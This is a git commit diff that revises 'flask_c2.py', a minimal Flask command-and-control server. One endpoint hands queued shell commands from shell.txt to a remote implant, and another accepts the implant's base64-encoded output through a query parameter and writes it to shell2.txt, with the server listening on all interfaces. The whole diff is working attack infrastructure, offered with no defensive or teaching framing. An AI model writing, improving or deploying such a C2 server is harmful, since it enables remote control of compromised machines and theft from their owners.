a742469313f07af2f7187f4370f1d6faed49a96f
edsabi <38739707+edsabi@users.noreply.github.com>
2024-11-13 15:57:22 -0500

    Update flask_c2.py

--- flask_c2.py
+++ flask_c2.py
@@ -1,33 +1,34 @@
-from flask import Flask
-
-
+from flask import Flask, request
 import base64
+import urllib.parse
 
 app = Flask(__name__)
 
 @app.route("/")
 def GET_hello():
-    with open('shell.txt','w') as ifile:
+    with open('shell.txt', 'w') as ifile:
         ifile.write('')
     return 'hello'
 
 @app.route("/cli")
 def GET_cmd():
-    with open('shell.txt','r') as ifile:
+    with open('shell.txt', 'r') as ifile:
         message = ifile.read()
     return message
-@app.route("/hax/<path:subpath>")
-def waiting(subpath):
-    with open('shell.txt','w') as ifile:
+
+@app.route("/hax")
+def waiting():
+    data = request.args.get('data', '')
+    data = urllib.parse.unquote(data)
+    with open('shell.txt', 'w') as ifile:
         ifile.write('')
-    with open('shell2.txt','w') as ofile:
+    with open('shell2.txt', 'w') as ofile:
         try:
-            ofile.write(str(base64.b64decode(subpath).decode('utf-16'))+str(base64.b64decode(subpath)))
-        except:
-            try:
-                ofile.write(str(base64.b64decode(subpath)))
-            except:
-                ofile.write(str(base64.b64decode(subpath).decode('utf-16')))
+            decoded_output = base64.b64decode(data).decode('utf-8')
+            ofile.write(decoded_output)
+        except Exception as e:
+            ofile.write('Error decoding data: ' + str(e))
     return ''
+
 if __name__ == "__main__":
-    app.run(host= '0.0.0.0',port=50050)
+    app.run(host='0.0.0.0', port=8080)
